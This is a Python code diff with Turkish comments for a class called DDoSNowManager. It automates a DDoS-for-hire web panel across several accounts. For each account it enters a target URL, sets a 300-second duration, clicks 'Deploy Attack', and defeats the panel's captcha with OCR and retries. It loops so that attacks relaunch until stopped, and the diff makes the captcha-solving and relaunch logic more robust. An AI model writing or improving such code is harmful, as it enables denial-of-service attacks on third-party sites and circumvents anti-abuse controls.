@@ -52,7 +52,6 @@ class DDoSNowManager:
             for line in f:
                 line = line.strip()
                 if line and not line.startswith("#"):
-                    # 🔥 DÜZELTME 1: Sadece ilk 2 ':' karakterinde böl, URL'deki ':'leri koru!
                     p = line.split(":", 2)
                     if len(p) == 3:
                         accounts.append({
@@ -66,18 +65,20 @@ class DDoSNowManager:
                         logger.warning(f"Geçersiz satır atlandı: {line}")
         return accounts
 
-    def solve_captcha(self, page, username):
-        attempt = 0
-        while True:
-            attempt += 1
+    def solve_captcha(self, page, username, max_attempts=10):
+        """Captcha çöz. Başarısız olursa False dön, ana döngü sayfayı yenilesin."""
+        for attempt in range(1, max_attempts + 1):
             try:
+                # Captcha image'i bekle (max 5 sn)
                 img_elem = page.locator("img[alt='captcha']").first
                 if img_elem.count() == 0:
+                    logger.warning(f"[{username}] Captcha image bulunamadı (deneme {attempt})")
                     time.sleep(1)
                     continue
-                    
+
                 img_src = img_elem.get_attribute("src")
                 if not img_src or not img_src.startswith("data:image"):
+                    logger.warning(f"[{username}] Captcha src geçersiz (deneme {attempt})")
                     time.sleep(1)
                     continue
 
@@ -89,48 +90,63 @@ class DDoSNowManager:
                 captcha_text = re.sub(r'[^A-Z0-9]', '', captcha_text.upper())
 
                 if not captcha_text:
+                    logger.warning(f"[{username}] OCR boş döndü (deneme {attempt})")
                     time.sleep(1)
                     continue
 
-                logger.info(f"[{username}] OCR (deneme {attempt}): {captcha_text}")
+                logger.info(f"[{username}] OCR (deneme {attempt}/{max_attempts}): {captcha_text}")
 
+                # Inputu bul ve doldur
                 captcha_input = page.locator("input[name='captcha']").first
                 if captcha_input.count() == 0:
-                    logger.error(f"[{username}] Captcha input bulunamadı!")
-                    return False
-                    
+                    logger.error(f"[{username}] Captcha input yok (deneme {attempt})")
+                    time.sleep(1)
+                    continue
+
                 captcha_input.fill("")
                 time.sleep(0.3)
                 captcha_input.fill(captcha_text)
                 time.sleep(0.5)
 
+                # Submit butonu bul ve tıkla
                 deploy_btn = page.locator("button[type='submit'][form='hubForm']").first
                 if deploy_btn.count() == 0:
                     deploy_btn = page.locator("button.btn-confirm:has-text('Deploy Attack')").last
                 if deploy_btn.count() == 0:
-                    logger.error(f"[{username}] Deploy butonu bulunamadı!")
-                    return False
-                    
+                    logger.error(f"[{username}] Deploy butonu yok (deneme {attempt})")
+                    time.sleep(1)
+                    continue
+
                 deploy_btn.click()
                 time.sleep(2)
 
+                # Sonuç kontrolü
                 if page.locator("text=Invalid captcha code").count() > 0:
-                    logger.warning(f"[{username}] YANLIŞ captcha: {captcha_text}")
-                    captcha_input.fill("")
+                    logger.warning(f"[{username}] YANLIŞ captcha: {captcha_text} (deneme {attempt})")
+                    # Eski captcha mesajını temizle ki bir sonraki turda tekrar görmeyelim
+                    try:
+                        page.locator("text=Invalid captcha code").first.evaluate("el => el.remove()")
+                    except:
+                        pass
                     time.sleep(1)
                     continue
-                
+
                 if page.locator("text=Attack Launched").count() > 0 or page.locator(".Toastify__toast--success").count() > 0:
                     logger.info(f"[{username}] DOĞRU captcha: {captcha_text} - Attack başlatıldı!")
                     return True
-                    
-                logger.info(f"[{username}] DOĞRU captcha: {captcha_text}")
+
+                # Ne hata ne başarı mesajı var, ama muhtemelen başarılı
+                logger.info(f"[{username}] Captcha kabul edildi (deneme {attempt}): {captcha_text}")
                 return True
-                    
+
             except Exception as e:
-                logger.error(f"[{username}] Captcha hatası (deneme {attempt}): {e}")
+                logger.error(f"[{username}] Captcha exception (deneme {attempt}): {e}")
                 time.sleep(2)
                 continue
+
+        # 10 deneme bitti, hepsi başarısız
+        logger.error(f"[{username}] {max_attempts} deneme sonucu captcha çözülemedi!")
+        return False
 
     def browser_worker(self, acc_id, target_url, account_data):
         username = account_data["user"]
@@ -200,7 +216,7 @@ class DDoSNowManager:
                         time.sleep(30)
                         continue
 
-                    # ANA DÖNGÜ
+                    # ANA DÖNGÜ - Attack başlat
                     attack_count = 0
                     while self.running_states.get(acc_id, False) and not (stop_event and stop_event.is_set()):
                         try:
@@ -215,19 +231,17 @@ class DDoSNowManager:
                                 time.sleep(3)
                                 continue
                             
-                            # 🔥 DÜZELTME 2: Önce temizle, sonra doğru URL'yi gir
                             target_input.fill("")
                             time.sleep(0.5)
                             target_input.fill(target_url)
                             logger.info(f"[{username}] Hedef URL: {target_url}")
                             
-                            # 2. Süre inputunun açılmasını bekle (max 15 saniye)
-                            # 🔥 DÜZELTME 3: wait_for_selector kullan, döngü değil
+                            # 2. Süre inputunu bekle
                             try:
                                 time_input = page.wait_for_selector("input[name='hub.0.time']", timeout=15000)
                                 logger.info(f"[{username}] Süre inputu aktif!")
                             except PlaywrightTimeout:
-                                logger.error(f"[{username}] Süre input 15 saniyede açılmadı! Muhtemelen URL geçersiz.")
+                                logger.error(f"[{username}] Süre input 15 sn'de açılmadı!")
                                 page.reload()
                                 time.sleep(5)
                                 continue
@@ -237,7 +251,7 @@ class DDoSNowManager:
                             time_input.fill("300")
                             logger.info(f"[{username}] Süre: 300 saniye")
                             
-                            # 3. Deploy Attack butonuna tıkla
+                            # 3. Deploy butonuna tıkla
                             deploy_btn = page.locator("button.btn-confirm:has-text('Deploy Attack')").first
                             if deploy_btn.count() == 0:
                                 deploy_btn = page.locator("button:has-text('Deploy Attack')").first
@@ -250,12 +264,12 @@ class DDoSNowManager:
                             logger.info(f"[{username}] Deploy butonuna tıklandı")
                             time.sleep(2)
                             
-                            # 4. Captcha çöz
-                            if not self.solve_captcha(page, username):
-                                logger.error(f"[{username}] Captcha çözülemedi!")
+                            # 4. Captcha çöz (max 10 deneme)
+                            if not self.solve_captcha(page, username, max_attempts=10):
+                                logger.error(f"[{username}] Captcha başarısız! Sayfa yenileniyor...")
                                 page.reload()
                                 time.sleep(5)
-                                continue
+                                continue  # 🔥 BAŞTAN DÖN: URL ve süre tekrar doldurulacak
                             
                             logger.info(f"[{username}] Attack başladı!")
                             
@@ -281,7 +295,7 @@ class DDoSNowManager:
                             if not self.running_states.get(acc_id, False):
                                 break
                             
-                            # 6. Yenile
+                            # 6. Yeniden başlat
                             logger.info(f"[{username}] Yeniden başlatılıyor...")
                             page.reload()
                             time.sleep(5)
